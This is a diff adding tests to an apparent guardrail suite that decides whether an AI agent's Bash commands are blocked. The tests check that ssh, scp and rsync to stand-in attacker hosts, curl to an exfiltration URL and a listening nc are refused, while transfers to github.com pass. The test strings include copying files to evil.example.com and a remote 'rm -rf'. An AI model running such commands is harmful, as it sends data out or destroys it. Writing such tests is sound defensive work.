@@ -163,6 +163,15 @@ describe("guardrails — network chaining bypass (security-hardening)", () => {
     assert.ok(evaluate("Bash", { command: 'curl "$EXFIL_URL"' })?.startsWith("Blocked"), "curl $VAR must fail closed");
     assert.ok(evaluate("Bash", { command: "nc -l 4444" })?.startsWith("Blocked"), "listening nc must fail closed");
   });
+  it("checks the real ssh/scp/rsync target (user@host / host:path), not flag values or local files", () => {
+    assert.ok(evaluate("Bash", { command: "ssh user@evil.example.com 'rm -rf x'" })?.startsWith("Blocked"), "ssh user@evil blocked");
+    assert.ok(evaluate("Bash", { command: "scp ./local.txt deploy@evil.example.com:/tmp/x" })?.startsWith("Blocked"), "scp to evil blocked");
+    assert.ok(evaluate("Bash", { command: "rsync -avz ./ backup.evil.com:/data" })?.startsWith("Blocked"), "rsync host:path to evil blocked");
+    // Legit target to an allowed host must NOT be falsely blocked by a local
+    // filename or an `-i key` flag value being misread as the host.
+    assert.equal(evaluate("Bash", { command: "scp ./f.txt deploy@github.com:/tmp" }), null, "scp to github allowed");
+    assert.equal(evaluate("Bash", { command: "ssh -i mykey git@github.com" }), null, "ssh -i key to github allowed");
+  });
 });
 
 describe("guardrails — rm -rf flag/target normalization (security-hardening)", () => {
